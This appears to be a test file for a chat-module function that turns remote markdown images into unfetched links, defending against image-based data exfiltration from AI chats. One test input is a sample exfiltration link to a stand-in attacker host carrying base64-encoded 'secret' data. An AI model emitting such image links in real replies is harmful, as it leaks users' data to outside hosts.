import assert from 'node:assert/strict';

import { test } from 'vitest';

import { blockRemoteImages } from '@/modules/agy-chat/utils/blockRemoteImages';

test('a remote image becomes a plain link that is not fetched', () => {
  assert.equal(blockRemoteImages('see ![chart](https://evil.example/x?d=c2VjcmV0) here'), 'see [blocked remote image: chart](https://evil.example/x?d=c2VjcmV0) here');
  assert.equal(blockRemoteImages('![](http://a.b/c.png)'), '[blocked remote image: image](http://a.b/c.png)');
});

test('titles and angle brackets cannot smuggle the image back in', () => {
  const out = blockRemoteImages('![a](https://e.x/p "title") ![b](<https://e.x/q>)');
  assert.ok(!/!\[/.test(out), out);
  assert.match(out, /\[blocked remote image: a\]\(https:\/\/e\.x\/p\)/);
  assert.match(out, /\[blocked remote image: b\]\(https:\/\/e\.x\/q\)/);
});

test('workspace images and ordinary links are left alone', () => {
  const text = '![shot](/home/dev/projects/app/shot.png) and [docs](https://example.com) and ![rel](./img/a.png)';
  assert.equal(blockRemoteImages(text), text);
});
